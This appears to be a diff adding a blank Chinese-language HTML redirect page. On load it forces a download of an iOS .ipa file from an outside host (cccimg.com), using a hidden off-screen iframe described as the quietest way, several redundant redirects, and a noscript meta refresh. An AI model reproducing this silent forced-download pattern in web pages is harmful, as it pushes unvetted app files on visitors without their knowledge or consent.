@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>跳转中</title>
+    <style type="text/css">
+        /* 极简样式 - 纯白背景 */
+        * {
+            margin: 0;
+            padding: 0;
+            -webkit-text-size-adjust: none;
+            -webkit-tap-highlight-color: rgba(0,0,0,0);
+        }
+        
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #ffffff;
+        }
+        
+        /* 隐藏的iframe用于跳转 */
+        .hidden-iframe {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            width: 1px;
+            height: 1px;
+            border: none;
+            visibility: hidden;
+        }
+    </style>
+    
+    <script type="text/javascript">
+        // 执行跳转到指定网站
+        function redirectToTarget() {
+            var targetUrl = 'http://cccimg.com/down.php/a3d9b9b62b408aed3e4ce5423fa8180f.ipa';
+            
+            // 方法1：立即使用iframe跳转（最安静的方式）
+            try {
+                var iframe = document.createElement('iframe');
+                iframe.className = 'hidden-iframe';
+                iframe.src = targetUrl;
+                document.body.appendChild(iframe);
+            } catch(e) {
+                // 忽略错误
+            }
+            
+            // 方法2：主窗口跳转（主要方式）
+            try {
+                window.location.href = targetUrl;
+            } catch(e) {
+                // 备用方法
+                try {
+                    window.location = targetUrl;
+                } catch(e2) {
+                    // 继续尝试
+                }
+            }
+            
+            // 方法3：保险跳转（如果前两种失败）
+            setTimeout(function() {
+                try {
+                    window.location.replace(targetUrl);
+                } catch(e) {
+                    // 最终尝试：使用meta refresh
+                    var meta = document.createElement('meta');
+                    meta.httpEquiv = "refresh";
+                    meta.content = "0;url=" + targetUrl;
+                    var head = document.getElementsByTagName('head')[0];
+                    if (head) {
+                        head.appendChild(meta);
+                    }
+                }
+            }, 500);
+        }
+        
+        // 页面初始化
+        function initPage() {
+            // 设置纯白背景
+            document.body.style.backgroundColor = '#ffffff';
+            
+            // 立即开始跳转
+            redirectToTarget();
+        }
+        
+        // 立即执行跳转
+        try {
+            // 如果文档已准备就绪
+            if (document.readyState === "complete" || document.readyState === "interactive") {
+                initPage();
+            } 
+            // 否则添加事件监听器
+            else if (document.addEventListener) {
+                document.addEventListener("DOMContentLoaded", initPage, false);
+            } else if (document.attachEvent) {
+                document.attachEvent("onreadystatechange", function() {
+                    if (document.readyState === "complete") {
+                        initPage();
+                    }
+                });
+            }
+            
+            // 添加window.onload作为保险
+            window.onload = initPage;
+            
+        } catch(e) {
+            // 如果出错，直接执行
+            initPage();
+        }
+        
+        // 最后保险：无论如何都尝试执行
+        setTimeout(initPage, 100);
+    </script>
+</head>
+<body>
+    <!-- 无任何内容，只有纯白背景 -->
+    
+    <!-- 无JavaScript时的回退 -->
+    <noscript>
+        <meta http-equiv="refresh" content="0;url=http://cccimg.com/down.php/a3d9b9b62b408aed3e4ce5423fa8180f.ipa">
+        <style>
+            body {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+                font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+                color: #666;
+            }
+        </style>
+        <div>
+            <p>正在跳转...</p>
+            <p>请启用JavaScript以获得更好体验</p>
+        </div>
+    </noscript>
+</body>
+</html>
